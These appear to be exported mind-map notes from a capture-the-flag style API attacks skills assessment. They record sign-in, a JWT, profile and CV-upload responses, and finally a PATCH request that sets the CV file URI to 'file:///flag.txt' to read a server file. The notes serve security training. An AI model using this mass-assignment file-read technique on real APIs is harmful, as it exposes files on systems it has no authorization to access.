> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/authentication/suppliers/sign-in → {   "Email": "B.Rogers1535@globalsolutions.com",   "Password": "Aa!123456" } → eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IkIuUm9nZXJzMTUzNUBnbG9iYWxzb2x1dGlvbnMuY29tIiwiZXhwIjoxNzc5ODIzODgzLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.LjpL03yr5l0-Oph3ATkbwbmolMDWSbpmk6iwOhSzlpxUx_W8qcUr3eWD3KDLCXv7xb4RanPnQ0555lVPb8DwCg
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c32214d1-1321-4d35-8455-4c4bf00eeddb -->

> [!output]+ 🟨 Output 047
> "errorMessage": "User does not have any roles assigned"
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/roles/current-user → "errorMessage": "User does not have any roles assigned"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b9bd6890-fcd5-424e-9c39-f5c2368eb763 -->

> [!output]+ 🟨 Output 048
> {
>   "successStatus": true,
>   "fileURI": "file:///app/wwwroot/SupplierCVs/cv2.pdf",
>   "fileSize": 51206
> }
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/suppliers/current-user/cv → upload CV.pdf → {   "successStatus": true,   "fileURI": "file:///app/wwwroot/SupplierCVs/cv2.pdf",   "fileSize": 51206 }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fa2cee18-3df4-4750-9659-5890f08c945d -->

> [!output]+ 🟨 Output 049
> {
>   "supplier": {
>     "id": "36f17195-395f-443e-93a4-8ceee81c6106",
>     "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>     "name": "Brandon Rogers",
>     "email": "B.Rogers1535@globalsolutions.com",
>     "securityQuestion": "What is your favorite color?",
>     "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf"
>   }
> }
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/suppliers/current-user → GET → {   "supplier": {     "id": "36f17195-395f-443e-93a4-8ceee81c6106",     "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",     "name": "Brandon Rogers",     "email": "B.Rogers1535@globalsolutions.com",     "securityQuestion": "What is your favorite color?",     "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf"   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 92415b63-099d-4617-97a5-e928fd921091 -->

> [!output]+ 🟨 Output 050
> "SuccessStatus": true
>
> **Source path:** API Attacks → Skills Assessment → Submit the contents of the flag at '/flag.txt'. → /api/v2/suppliers/current-user → PATCH → {   "SecurityQuestion": "What is your favorite color?",   "SecurityQuestionAnswer": "rust",   "ProfessionalCVPDFFileURI": "file:///flag.txt",   "PhoneNumber": "string",   "Password": "Aa!123456" } → "SuccessStatus": true
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 832e767e-a399-4131-aa2a-5fbc717a7bd8 -->
